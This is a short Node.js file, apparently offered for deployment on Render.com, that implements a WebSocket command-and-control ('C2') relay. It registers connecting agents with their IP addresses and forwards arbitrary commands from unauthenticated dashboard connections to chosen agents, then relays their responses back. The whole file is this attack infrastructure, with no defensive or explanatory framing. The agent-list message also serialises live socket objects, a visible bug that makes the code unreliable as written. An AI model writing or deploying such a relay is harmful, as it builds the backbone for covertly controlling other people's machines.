// FILE: server.js (Deploy to Render.com)
// Run: npm install express ws uuid
const express = require('express');
const { WebSocketServer } = require('ws');
const uuid = require('uuid');

const PORT = process.env.PORT || 3000;
const app = express();
const server = app.listen(PORT, () => console.log(`C2 Listening on ${PORT}`));
const wss = new WebSocketServer({ server });

const agents = new Map(); // Store connected agents
const controllers = new Set(); // Store OII Dashboards

wss.on('connection', (ws, req) => {
  const type = req.url.includes('dashboard') ? 'CONTROLLER' : 'AGENT';
  
  if (type === 'CONTROLLER') {
    controllers.add(ws);
    ws.send(JSON.stringify({ type: 'AGENTS_LIST', payload: Array.from(agents.values()) }));
    
    ws.on('message', (msg) => {
      // Forward command to specific agent
      const data = JSON.parse(msg);
      if (data.action && data.agentId && agents.has(data.agentId)) {
        const agentWs = agents.get(data.agentId).socket;
        agentWs.send(JSON.stringify(data));
      }
    });
    
    ws.on('close', () => controllers.delete(ws));
  } 
  else {
    // It's an Agent
    const agentId = req.headers['agent-id'] || uuid.v4();
    const agentData = { 
      id: agentId, 
      ip: req.socket.remoteAddress, 
      status: 'IDLE',
      lastHeartbeat: new Date() 
    };
    
    agents.set(agentId, { socket: ws, data: agentData });
    console.log(`Agent connected: ${agentId}`);
    
    // Broadcast new agent to controllers
    broadcast({ type: 'AGENT_CONNECTED', payload: agentData });

    ws.on('message', (msg) => {
      const response = JSON.parse(msg);
      // Broadcast agent response/heartbeat to controllers
      broadcast({ type: 'AGENT_RESPONSE', payload: response });
    });

    ws.on('close', () => {
      agents.delete(agentId);
      broadcast({ type: 'AGENT_DISCONNECTED', payload: { id: agentId } });
    });
  }
});

function broadcast(msg) {
  controllers.forEach(c => {
    if (c.readyState === 1) c.send(JSON.stringify(msg));
  });
}
